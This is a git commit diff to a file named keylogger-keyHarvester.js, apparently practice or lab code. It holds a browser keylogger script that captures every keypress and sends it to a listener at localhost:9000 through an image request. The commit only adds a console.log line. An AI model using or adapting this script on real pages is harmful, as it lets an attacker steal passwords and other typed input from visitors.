48eb9d2fbfc2b98deab2ff0914e8fccfe719b270
knthbyj <53057674+knthbyj@users.noreply.github.com>
2023-02-08 14:52:22 +0800

    Update keylogger-keyHarvester.js

--- keylogger-keyHarvester.js
+++ keylogger-keyHarvester.js
@@ -2,5 +2,6 @@
     document.onkeypress = function KeyLogger(inp){
         key_pressed = String.fromCharCode(inp.which);
         new Image().src = "http://localhost:9000/?"+key_pressed;
+        console.log(key_pressed)
     }
 </script>
